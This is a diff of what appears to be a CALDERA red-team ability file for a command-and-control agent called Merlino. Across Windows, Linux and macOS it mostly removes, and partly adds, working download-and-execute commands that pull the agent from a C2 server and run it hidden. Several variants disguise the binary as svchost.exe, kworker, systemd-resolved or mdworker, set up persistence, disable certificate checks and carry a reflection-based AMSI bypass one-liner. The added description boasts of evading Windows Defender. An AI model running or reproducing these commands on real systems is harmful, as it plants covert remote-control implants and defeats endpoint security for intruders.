@@ -2,7 +2,15 @@
 
 - id: merlino-1234-5678-90ab-cdef-merlino1
   name: Merlino
-  description: Merlino agent with AMSI/ETW bypass and full payload obfuscation. Process masquerading enabled.
+  description: |
+    Merlino is a fully stealth C# agent designed for professional red team operations.
+    It features complete AMSI/ETW bypass and is not detected by Windows Defender.
+    The agent is extremely reliable and lightweight (16KB).
+    
+    DISCLAIMER: This tool is intended for creating targeted, behavior-focused attack 
+    simulations in authorized security assessments only. The author assumes no 
+    responsibility for any malicious use of this agent. Unauthorized use is strictly 
+    prohibited and may violate applicable laws.
   tactic: command-and-control
   technique:
     attack_id: T1105
@@ -11,74 +19,12 @@
     windows:
       psh:
         command: |
-          $s="CALDERA_SERVER";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\Merlino.exe -server "https://$s"
-        variations:
-          - description: Download to TEMP and run hidden (edit CALDERA_SERVER first!)
-            command: |
-              $s="CALDERA_SERVER"
-              curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o "$env:TEMP\Merlino.exe"
-              Start-Process "$env:TEMP\Merlino.exe" -ArgumentList "-server","https://$s" -WindowStyle Hidden
-          - description: Download as svchost.exe to Public folder
-            command: |
-              $s="CALDERA_SERVER"
-              curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o "C:\Users\Public\svchost.exe"
-              Start-Process "C:\Users\Public\svchost.exe" -ArgumentList "-server","https://$s" -WindowStyle Hidden
-          - description: Production example (192.168.124.133)
-            command: |
-              $s="192.168.124.133"
-              curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe
-              .\Merlino.exe -server "https://$s"
-          - description: ADVANCED - Full stealth with AMSI/ETW bypass and process cleanup
-            command: |
-              $ErrorActionPreference="SilentlyContinue";$s="#{app.contact.http}";$p="C:\Users\Public\svchost.exe";try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,[IntPtr]::Zero)}}}}}catch{};gps|?{$_.Path -like "*svchost.exe" -and $_.Path -notlike "*System32*"}|spps -Force -EA SilentlyContinue;ri -Force $p -EA SilentlyContinue;[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.Add("platform","windows");$wc.Headers.Add("file","Merlino.exe");$data=$wc.DownloadData("$s/file/download");[System.IO.File]::WriteAllBytes($p,$data);Start-Process -FilePath $p -ArgumentList "-server $s" -WindowStyle Hidden -NoNewWindow
-          - description: ADVANCED - Deploy to AppData with AMSI bypass
-            command: |
-              $ErrorActionPreference="SilentlyContinue";$s="#{app.contact.http}";$p="$env:APPDATA\svchost.exe";try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,[IntPtr]::Zero)}}}}}catch{};[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.Add("file","Merlino.exe");$data=$wc.DownloadData("$s/file/download");[System.IO.File]::WriteAllBytes($p,$data);Start-Process -FilePath $p -ArgumentList "-server $s" -WindowStyle Hidden
+          curl.exe -k -H "file: Merlino.exe" "https://MORGANA_ADDRESS/file/download" -o Merlino.exe;.\Merlino.exe -server "https://MORGANA_ADDRESS"
     linux:
       sh:
         command: |
-          server="#{app.contact.http}";
-          curl -s -X POST -H "file:merlino.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd;
-          chmod +x /tmp/.systemd-networkd;
-          nohup /tmp/.systemd-networkd -server $server -group red &
-        variations:
-          - description: Deploy with kworker masquerading
-            command: |
-              server="#{app.contact.http}";
-              curl -s -X POST -H "file:merlino.go" -H "platform:linux" $server/file/download > /tmp/kworker;
-              chmod +x /tmp/kworker;
-              nohup /tmp/kworker -server $server -group red &
-          - description: Persistent deployment (requires root)
-            command: |
-              server="#{app.contact.http}";
-              curl -s -X POST -H "file:merlino.go" -H "platform:linux" $server/file/download > /usr/local/bin/systemd-resolved;
-              chmod +x /usr/local/bin/systemd-resolved;
-              nohup /usr/local/bin/systemd-resolved -server $server -group red &
-          - description: Deploy as blue-team agent
-            command: |
-              server="#{app.contact.http}";
-              curl -s -X POST -H "file:merlino.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd;
-              chmod +x /tmp/.systemd-networkd;
-              nohup /tmp/.systemd-networkd -server $server -group blue &
+          echo "Use sandcat agent"
     darwin:
       sh:
         command: |
-          server="#{app.contact.http}";
-          curl -s -X POST -H "file:merlino.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker;
-          chmod +x /tmp/mdworker;
-          nohup /tmp/mdworker -server $server -group red &
-        variations:
-          - description: (ARM64) For Apple Silicon Macs (M1/M2/M3)
-            architecture: ARM64
-            command: |
-              server="#{app.contact.http}";
-              curl -s -X POST -H "file:merlino.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > /tmp/mdworker;
-              chmod +x /tmp/mdworker;
-              nohup /tmp/mdworker -server $server -group red &
-          - description: (AMD64) Deploy as blue-team agent
-            architecture: AMD64
-            command: |
-              server="#{app.contact.http}";
-              curl -s -X POST -H "file:merlino.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker;
-              chmod +x /tmp/mdworker;
-              nohup /tmp/mdworker -server $server -group blue &
+          echo "Use sandcat agent"
